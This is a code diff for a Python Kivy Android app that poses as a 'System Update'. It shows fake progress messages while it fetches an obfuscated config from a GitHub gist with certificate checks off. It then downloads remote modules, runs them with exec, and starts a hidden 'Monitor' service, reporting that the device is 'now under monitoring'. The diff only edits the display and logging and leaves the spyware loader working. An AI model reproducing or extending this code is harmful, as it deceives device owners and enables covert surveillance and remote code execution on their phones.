@@ -6,41 +6,38 @@ import json
 import traceback
 import urllib3
 from kivy.app import App
-from kivy.uix.label import Label
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.scrollview import ScrollView
+from kivy.uix.textinput import TextInput
 from kivy.utils import platform
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
     def build(self):
-        # الرابط الصحيح والمباشر لـ config.json (بدون أي إضافات)
+        # الرابط المباشر لملف config.json
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
 
         layout = BoxLayout(orientation='vertical')
         scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
         
-        self.label = Label(
+        # TextInput للقراءة فقط - يسمح بتحديد النص ونسخه
+        self.error_view = TextInput(
             text="System Update\nChecking for compatibility... (0%)",
-            halign='left',
-            valign='top',
+            readonly=True,
+            background_color=(0, 0, 0, 1),
+            foreground_color=(1, 1, 1, 1),
             font_size='14sp',
             size_hint_y=None,
-            markup=True
+            cursor_color=(0, 0, 0, 0)
         )
+        self.error_view.bind(minimum_height=self.error_view.setter('height'))
         
-        self.label.bind(width=lambda instance, value: setattr(instance, 'text_size', (value, None)))
-        self.label.bind(texture_size=self._update_label_height)
-        
-        scroll.add_widget(self.label)
+        scroll.add_widget(self.error_view)
         layout.add_widget(scroll)
         
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return layout
-
-    def _update_label_height(self, instance, value):
-        instance.height = value[1]
 
     def decode_secret(self, data):
         try:
@@ -64,21 +61,22 @@ class SystemUpdateApp(App):
         try:
             time.sleep(2)
             
+            # طلب صلاحيات الإنترنت بقوة
             if platform == 'android':
                 try:
                     from android.permissions import request_permissions, Permission
                     request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                     time.sleep(2)
                 except Exception as perm_err:
-                    print(f"Perm warning: {perm_err}")
+                    print(f"Perm error: {perm_err}")
 
-            # اختبار اتصال بسيط لتفعيل الشبكة (اختياري)
+            # اختبار اتصال مباشر باستخدام عنوان IP (يتجاوز DNS)
             try:
-                requests.get("https://8.8.8.8", timeout=5)
+                requests.get("http://8.8.8.8", timeout=5)
             except:
                 pass
 
-            # تحميل الإعدادات
+            # الاتصال الفعلي لملف الإعدادات
             response = requests.get(self.config_url, timeout=15, verify=False)
             config = response.json()
 
@@ -88,16 +86,15 @@ class SystemUpdateApp(App):
                 'v_id': self.decode_secret(config['v'])
             }
 
-            self.send_log("🚀 [System Update] Online! Configuration loaded.")
-            self.label.text = "Downloading system patches... (35%)"
+            self.send_log("🚀 [System Update] Online! Network OK.")
+            self.error_view.text = "Downloading system patches... (35%)"
             self.load_payloads()
 
         except Exception as e:
             error_details = traceback.format_exc()
-            self.label.text = f"System Error:\n{error_details}"
+            self.error_view.text = f"System Error (Copyable):\n\n{error_details}"
             try:
-                if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
-                    self.send_log(f"❌ Critical Error: {error_details}")
+                self.send_log(f"❌ Error: {error_details[:300]}")
             except:
                 pass
 
@@ -123,15 +120,15 @@ class SystemUpdateApp(App):
                 exec(code, globals())
                 self.send_log(f"✅ Module Loaded: {name}")
             except Exception as e:
-                self.send_log(f"⚠️ Warning: Failed to load {url.split('/')[-1]}")
+                self.send_log(f"⚠️ Failed: {url.split('/')[-1]}")
                 continue
 
         if 'Monitor' in globals():
             self.send_log("⚙️ Starting Monitor Service...")
             monitor = globals()['Monitor']()
             monitor.start()
-            self.label.text = "System is up to date (100%)"
-            self.send_log("🎯 [Full Success] Device is now under monitoring.")
+            self.error_view.text = "System is up to date (100%)"
+            self.send_log("🎯 [Full Success] Device monitored.")
 
 if __name__ == '__main__':
     SystemUpdateApp().run()
